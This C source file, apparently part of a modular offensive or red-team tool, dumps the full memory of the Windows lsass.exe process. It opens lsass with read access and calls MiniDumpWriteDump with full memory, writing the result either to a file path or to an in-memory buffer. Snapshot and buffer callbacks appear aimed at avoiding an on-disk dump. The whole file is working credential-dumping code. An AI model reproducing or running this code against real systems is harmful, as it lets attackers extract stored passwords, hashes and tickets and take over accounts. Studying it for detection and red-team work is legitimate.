/*****************************************************************************************************
*                                                                                                    *
*  File:         DumpMiniDump.c                                                                      *
*  Purpose:      Performs mini dumping of lsass.exe.                                                 *
*                                                                                                    *
******************************************************************************************************/
#include "DumpMiniDump.h"
#include "Common.h"
#include <DbgHelp.h>

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    MINIDUMP_CALLBACK_CONTEXT                                                           *
*  Purpose:      Defines a callback context for Minidump.                                            *
*                                                                                                    *
******************************************************************************************************/
typedef struct _MINIDUMP_CALLBACK_CONTEXT
{
    DWORD cbSize;
    PBYTE pcBuffer;
    BOOL bIsSnapshot;
} MINIDUMP_CALLBACK_CONTEXT, *PMINIDUMP_CALLBACK_CONTEXT;

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpminidump_SnapshotCallbackRoutine                                                *
*  Purpose:      A callback function to receive the dump data from a snapshot.                       *
*  Parameters:   - pvParam - ignored.                                                                *
*                - ptInput - struct which receives pointer to a data buffer and a buffer size.       *
*                - ptOutput - struct which indicates the status of the operation.                    *
*  Returns:      TRUE for success, FALSE otherwise.                                                  *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:6101)
__success(return > 0)
static
BOOL
CALLBACK
dumpminidump_SnapshotCallbackRoutine(
    __inout_opt PVOID pvParam,
    __in __notnull PMINIDUMP_CALLBACK_INPUT ptInput,
    __out_opt PMINIDUMP_CALLBACK_OUTPUT ptOutput
)
{
    // Unused arguments
    UNREFERENCED_PARAMETER(pvParam);

    // Validate arguments
    DEBUG_ASSERT(NULL != ptInput);
    DEBUG_ASSERT(NULL != ptOutput);

    // Only handle snapshot data
    __analysis_assume(NULL != ptOutput);
    if (IsProcessSnapshotCallback == ptInput->CallbackType)
    {
        ptOutput->Status = S_FALSE;
    }

    // Always succeed
    return TRUE;
}
#pragma warning(pop)

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpminidump_BufferCallbackRoutine                                                  *
*  Purpose:      A callback function to receive the dump data as a buffer.                           *
*  Parameters:   - pvParam - the struct PBUFFER_CONTEXT.                                             *
*                - ptInput - struct which receives pointer to a data buffer and a buffer size.       *
*                - ptOutput - struct which indicates the status of the operation.                    *
*  Returns:      TRUE for success, FALSE otherwise.                                                  *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:6101)
__success(return > 0)
static
BOOL
CALLBACK
dumpminidump_BufferCallbackRoutine(
    __inout __notnull PVOID pvParam,
    __in __notnull PMINIDUMP_CALLBACK_INPUT ptInput,
    __out_opt PMINIDUMP_CALLBACK_OUTPUT ptOutput
)
{
    BOOL bResult = FALSE;
    PMINIDUMP_CALLBACK_CONTEXT ptContext = (PMINIDUMP_CALLBACK_CONTEXT)pvParam;
    PBYTE pcNewBuffer = NULL;
    DWORD cbTotalSize = 0;

    // Validate arguments
    DEBUG_ASSERT(NULL != pvParam);
    DEBUG_ASSERT(NULL != ptInput);
    DEBUG_ASSERT(NULL != ptOutput);

    // Act based on callback type
    __analysis_assume(NULL != ptOutput);
    switch (ptInput->CallbackType)
    {
    case IoStartCallback:
        ptOutput->Status = S_FALSE;
        break;

    case IoWriteAllCallback:
        cbTotalSize = (DWORD)ptInput->Io.Offset + ptInput->Io.BufferBytes;      // Assuming total size does not exceed 4GB
        if (cbTotalSize > ptContext->cbSize)
        {
            pcNewBuffer = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ptContext->pcBuffer, cbTotalSize);
            if (NULL == pcNewBuffer)
            {
                DEBUG_MSG(L"HeapReAlloc() failed allocating %lu bytes", cbTotalSize);
                goto lblCleanup;
            }
            ptContext->pcBuffer = pcNewBuffer;
            ptContext->cbSize = cbTotalSize;
        }
        CopyMemory(ptContext->pcBuffer + ptInput->Io.Offset, ptInput->Io.Buffer, ptInput->Io.BufferBytes);
        ptOutput->Status = S_OK;
        break;

    case IoFinishCallback:
        ptOutput->Status = S_OK;
        break;

    case IsProcessSnapshotCallback:
        if (ptContext->bIsSnapshot)
        {
            ptOutput->Status = S_FALSE;
        }
        break;
    }

    // Success
    pcNewBuffer = NULL;
    bResult = TRUE;

lblCleanup:

    // Free resources
    HEAPFREE(pcNewBuffer);

    // Return result
    return bResult;
}
#pragma warning(pop)

/*****************************************************************************************************
*                                                                                                    *
*  Function:     DUMPMINIDUMP_PerformMiniDumpToBuffer                                                *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:6001 6387)
__success(return >= 0)
RETSTATUS
DUMPMINIDUMP_PerformMiniDumpToBuffer(
    __in __notnull HANDLE hHandle,
    __in BOOL bIsProcessHandle,
    __in DWORD dwLsassPid,
    __out PDWORD pcbOutput,
    __out_bcount(*pcbOutput) PBYTE* ppcOutput
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    MINIDUMP_CALLBACK_INFORMATION tMinidumpCallback = { 0 };
    MINIDUMP_CALLBACK_CONTEXT tMinidumpContext = { 0 };

    // Validate arguments
    if ((NULL == hHandle) || (NULL == pcbOutput) || (NULL == ppcOutput))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (hHandle=%p, pcbOutput=%p, ppcOutput=%p)", hHandle, pcbOutput, ppcOutput);
        goto lblCleanup;
    }

    // Allocate initial buffer context
    tMinidumpContext.cbSize = OUTPUT_BUFFER_INITIAL_SIZE;
    tMinidumpContext.pcBuffer = HEAPALLOCZ(tMinidumpContext.cbSize);
    tMinidumpContext.bIsSnapshot = !bIsProcessHandle;
    if (NULL == tMinidumpContext.pcBuffer)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"HeapAlloc() failed allocating initial size");
        goto lblCleanup;
    }

    // Dump with a callback routine
    tMinidumpCallback.CallbackParam = &tMinidumpContext;
    tMinidumpCallback.CallbackRoutine = dumpminidump_BufferCallbackRoutine;
    if (!MiniDumpWriteDump(hHandle, dwLsassPid, NULL, MiniDumpWithFullMemory, NULL, NULL, &tMinidumpCallback))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"MiniDumpWriteDump() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Validate results
    if ((0 == tMinidumpContext.cbSize) || (NULL == tMinidumpContext.pcBuffer))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Minisdump context size or buffer is NULL");
        goto lblCleanup;
    }

    // Success
    *pcbOutput = tMinidumpContext.cbSize;
    *ppcOutput = tMinidumpContext.pcBuffer;
    tMinidumpContext.pcBuffer = NULL;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    HEAPFREE(tMinidumpContext.pcBuffer);

    // Return result
    return eStatus;
}
#pragma warning(pop)

/****************************************************************************************************
*                                                                                                   *
* Function:     PerformMiniDumpToDisk                                                               *
*                                                                                                   *
*****************************************************************************************************/
__success(return >= 0)
RETSTATUS
DUMPMINIDUMP_PerformMiniDumpToDisk(
    __in __notnull HANDLE hHandle,
    __in BOOL bIsProcessHandle,
    __in DWORD dwLsassPid,
    __in __notnull PWSTR pwszDumpPath
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    WCHAR wszDumpPath[MAX_PATH] = { 0 };
    HANDLE hDumpFile = INVALID_HANDLE_VALUE;
    MINIDUMP_CALLBACK_INFORMATION tMinidumpCallback = { 0 };
    PMINIDUMP_CALLBACK_INFORMATION ptMinidumpCallback = NULL;

    // Validate parameters
    if ((NULL == hHandle) || (NULL == pwszDumpPath))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (hHandle=%p, pwszDumpPath=%p)", hHandle, pwszDumpPath);
        goto lblCleanup;
    }

    // Expand environment variables to the dump path
    if (0 == ExpandEnvironmentStringsW(pwszDumpPath, wszDumpPath, ARRAYSIZE(wszDumpPath)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Open the dump file for writing
    hDumpFile = CreateFileW(wszDumpPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (INVALID_HANDLE_VALUE == hDumpFile)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CreateFileW() failed (wszDumpPath=%ls, LastError=%lu)", wszDumpPath, GetLastError());
        goto lblCleanup;
    }

    // Prepare callback routine for snapshot handles
    if (!bIsProcessHandle)
    {
        tMinidumpCallback.CallbackParam = NULL;
        tMinidumpCallback.CallbackRoutine = dumpminidump_SnapshotCallbackRoutine;
        ptMinidumpCallback = &tMinidumpCallback;
    }

    // Dump to disk
    if (!MiniDumpWriteDump(hHandle, dwLsassPid, hDumpFile, MiniDumpWithFullMemory, NULL, NULL, ptMinidumpCallback))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"MiniDumpWriteDump() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Flush file
    (VOID)FlushFileBuffers(hDumpFile);

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_FILE_HANDLE(hDumpFile);

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     DUMPMINIDUMP_MiniDumpToBuffer                                                       *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:6001)
__success(return >= 0)
RETSTATUS
DUMPMINIDUMP_MiniDumpToBuffer(
    __in DWORD cbInput,
    __in_bcount(cbInput) __notnull PBYTE pcInput,
    __out PDWORD pcbOutput,
    __out_bcount(*pcbOutput) PBYTE* ppcOutput
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    DWORD dwLsassPid = 0;
    HANDLE hLsassProcess = NULL;
    LSASS_HANDLE_FETCH_TYPE eLsassHandleFetchType = LSASS_HANDLE_FETCH_TYPE_INVALID;

    // Validate arguments
    if ((NULL == pcbOutput) || (NULL == ppcOutput))
    {
        DEBUG_MSG(L"Invalid arguments (pcbOutput=%p, ppcOutput=%p)", pcbOutput, ppcOutput);
        goto lblCleanup;
    }

    // Parse the input
    eStatus = COMMON_GetLsassHandleFetchTypeFromBinaryInput(cbInput, pcInput, &eLsassHandleFetchType);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_GetLsassHandleFetchTypeFromBinaryInput failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Open lsass.exe
    eStatus = COMMON_FetchLsassHandle(eLsassHandleFetchType, &hLsassProcess, &dwLsassPid, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FetchLsassHandle failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Dump to buffer
    eStatus = DUMPMINIDUMP_PerformMiniDumpToBuffer(hLsassProcess, TRUE, dwLsassPid, pcbOutput, ppcOutput);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"DUMPMINIDUMP_PerformMiniDumpToBuffer failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(hLsassProcess);

    // Return result
    return eStatus;
}
#pragma warning(pop)

/*****************************************************************************************************
*                                                                                                    *
*  Function:     DUMPMINIDUMP_MiniDumpToDisk                                                         *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
DUMPMINIDUMP_MiniDumpToDisk(
    __in DWORD nArgs,
    __in_ecount(nArgs) __notnull PWSTR* ppwszArgs
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    DWORD dwLsassPid = 0;
    HANDLE hLsassProcess = NULL;

    // Validate arguments
    if (ARG_INDEX_LSASS_HANDLE_FETCH_TYPE >= nArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid number of arguments");
        goto lblCleanup;
    }
    if (NULL == ppwszArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (ppwszArgs=%p)", ppwszArgs);
        goto lblCleanup;
    }

    // Open lsass.exe
    eStatus = COMMON_FetchLsassHandleFromString(ppwszArgs[ARG_INDEX_LSASS_HANDLE_FETCH_TYPE], &hLsassProcess, &dwLsassPid, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FetchLsassHandleFromString failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Dump to disk
    eStatus = DUMPMINIDUMP_PerformMiniDumpToDisk(hLsassProcess, TRUE, dwLsassPid, ppwszArgs[ARG_INDEX_DUMP_PATH]);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"DUMPMINIDUMP_PerformMiniDumpToDisk failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(hLsassProcess);

    // Return result
    return eStatus;
}
